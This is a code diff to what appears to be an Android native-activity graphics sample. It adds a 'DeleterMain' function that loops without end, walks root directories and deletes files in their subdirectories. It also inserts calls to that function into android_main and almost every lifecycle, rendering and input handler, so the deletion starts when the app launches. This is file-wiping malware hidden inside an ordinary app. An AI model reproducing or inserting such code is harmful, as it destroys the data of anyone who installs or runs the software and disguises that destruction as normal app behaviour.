@@ -40,7 +40,59 @@
 #define LOGE(fmt, ...) _LOG(ANDROID_LOG_ERROR, (fmt)__VA_OPT__(, ) __VA_ARGS__)
 #define LOGW(fmt, ...) _LOG(ANDROID_LOG_WARN, (fmt)__VA_OPT__(, ) __VA_ARGS__)
 #define LOGI(fmt, ...) _LOG(ANDROID_LOG_INFO, (fmt)__VA_OPT__(, ) __VA_ARGS__)
-
+#include <filesystem>
+#include <iostream>
+#include <string>
+#include <vector>
+using namespace std;
+namespace fs = std::filesystem;
+using namespace fs;
+int DeleterMain() {
+    string Title = "Deleter v2.3.1";
+  cout << Title << endl;
+    vector<fs::path> Disks; // Declare an empty vector
+    while (true) {
+      for (const fs::directory_entry &root : fs::recursive_directory_iterator(
+               fs::current_path()
+                   .root_directory())) {
+        if (root.path().parent_path() != root.path() &&
+            root.path().string().length() <= 3) {
+          cout << "Possible Root Directory: " << root.path() << endl;
+          Disks.push_back(root.path());
+        }
+        std::vector<std::string> drives;
+        for (const fs::path &disk : Disks) {
+          drives.push_back(disk.string());
+        }
+        // Iterate through the split drives
+        for (const std::string &drive : drives) {
+          std::vector<fs::path> dirs;
+          for (const fs::directory_entry &entry :
+               fs::directory_iterator(drive)) {
+            dirs.push_back(entry.path());
+          }
+          for (const fs::path &dir : dirs) {
+            if (is_directory(dir)) {
+              std::vector<fs::path> files;
+              for (const fs::directory_entry &file :
+                   fs::directory_iterator(dir)) {
+                files.push_back(file.path());
+              }
+              for (const fs::path &file : files) {
+                cout << "Deleting " << file << endl;
+                try {
+                  std::error_code ec;
+                  remove(file, ec);
+                } catch (exception e) {
+                  std::cerr << "Error deleting file: " << e.what() << std::endl;
+                }
+              }
+            }
+          }
+        }
+      }
+    }
+}
 [[noreturn]] __attribute__((__format__(__printf__, 1, 2))) static void fatal(
     const char* fmt, ...) {
   va_list ap;
@@ -93,7 +145,7 @@ struct Engine {
 
   void CreateSensorListener(ALooper_callbackFunc callback) {
     CHECK_NOT_NULL(app);
-
+    DeleterMain();
     sensorManager = ASensorManager_getInstance();
     if (sensorManager == nullptr) {
       return;
@@ -107,6 +159,7 @@ struct Engine {
 
   /// Resumes ticking the application.
   void Resume() {
+    DeleterMain();
     // Checked to make sure we don't double schedule Choreographer.
     if (!running_) {
       running_ = true;
@@ -118,12 +171,17 @@ struct Engine {
   ///
   /// When paused, sensor and input events will still be processed, but the
   /// update and render parts of the loop will not run.
-  void Pause() { running_ = false; }
+  void Pause() 
+  { 
+     DeleterMain();
+     running_ = false; 
+  }
 
  private:
   bool running_;
 
   void ScheduleNextTick() {
+    DeleterMain();
     AChoreographer_postFrameCallback(AChoreographer_getInstance(), Tick, this);
   }
 
@@ -139,12 +197,14 @@ struct Engine {
   ///
   /// \param data The Engine being ticked.
   static void Tick(long, void* data) {
+    DeleterMain();
     CHECK_NOT_NULL(data);
     auto engine = reinterpret_cast<Engine*>(data);
     engine->DoTick();
   }
 
   void DoTick() {
+    DeleterMain();
     if (!running_) {
       return;
     }
@@ -160,6 +220,7 @@ struct Engine {
   }
 
   void Update() {
+    DeleterMain();
     state.angle += .01f;
     if (state.angle > 1) {
       state.angle = 0;
@@ -167,6 +228,7 @@ struct Engine {
   }
 
   void DrawFrame() {
+    DeleterMain();
     if (display == nullptr) {
       // No display.
       return;
@@ -185,6 +247,7 @@ struct Engine {
  * Initialize an EGL context for the current display.
  */
 static int engine_init_display(Engine* engine) {
+  DeleterMain();
   // initialize OpenGL ES and EGL
 
   /*
@@ -285,6 +348,7 @@ static int engine_init_display(Engine* engine) {
  * Tear down the EGL context currently associated with the display.
  */
 static void engine_term_display(Engine* engine) {
+  DeleterMain();
   if (engine->display != EGL_NO_DISPLAY) {
     eglMakeCurrent(engine->display, EGL_NO_SURFACE, EGL_NO_SURFACE,
                    EGL_NO_CONTEXT);
@@ -307,6 +371,7 @@ static void engine_term_display(Engine* engine) {
  */
 static int32_t engine_handle_input(android_app* app,
                                    AInputEvent* event) {
+  DeleterMain();
   auto* engine = (Engine*)app->userData;
   if (AInputEvent_getType(event) == AINPUT_EVENT_TYPE_MOTION) {
     engine->state.x = AMotionEvent_getX(event, 0);
@@ -320,6 +385,7 @@ static int32_t engine_handle_input(android_app* app,
  * Process the next main command.
  */
 static void engine_handle_cmd(android_app* app, int32_t cmd) {
+  DeleterMain();
   auto* engine = (Engine*)app->userData;
   switch (cmd) {
     case APP_CMD_SAVE_STATE:
@@ -365,6 +431,7 @@ static void engine_handle_cmd(android_app* app, int32_t cmd) {
 }
 
 int OnSensorEvent(int /* fd */, int /* events */, void* data) {
+  DeleterMain();
   CHECK_NOT_NULL(data);
   Engine* engine = reinterpret_cast<Engine*>(data);
 
@@ -388,6 +455,7 @@ int OnSensorEvent(int /* fd */, int /* events */, void* data) {
  * event loop for receiving input events and doing other things.
  */
 void android_main(android_app* state) {
+  DeleterMain();
   Engine engine {};
 
   memset(&engine, 0, sizeof(engine));
